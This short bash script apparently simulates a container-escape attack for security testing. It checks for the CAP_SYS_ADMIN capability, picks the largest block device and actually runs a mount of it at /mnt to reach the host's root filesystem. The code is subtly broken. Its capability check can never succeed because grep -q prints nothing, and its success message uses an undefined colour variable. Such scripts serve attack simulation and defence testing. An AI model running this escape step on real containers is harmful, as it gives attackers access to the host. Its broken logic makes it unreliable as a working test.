#!/bin/bash

# define colors
GREEN="\e[32m"
YELLOW="\e[33m"
RED="\e[31m"
RESET="\e[0m"

# mount root host filesystem
echo -e "\n${YELLOW}>>> [Privilege Escalation] Escape to Host Technique ${RESET}"
echo "Let's simulate the case when an attacker mounts root host filesystem inside the container"

capability=$(capsh --print | grep "Bounding set" | grep -q "CAP_SYS_ADMIN");
device=$(lsblk -o NAME,SIZE -d | sort -k2 -h | tail -n 1 | awk '{print $1}')
error=$(mount /dev/$device /mnt/ 2>&1)

echo "Checking capabilities and trying to mount root host device ..."

if [[ -z "$capability" ]]; then
    echo -e "${RED}Error! CAP_SYS_ADMIN capability was not found ${RESET}"
elif [[ -n "$error" ]]; then
    echo -e "${RED}Error! Mount of the device ${device} was failed: $error ${RESET}"
    else
    echo -e "${Green}Success! The root host device ${device} was mounted ${RESET}"
fi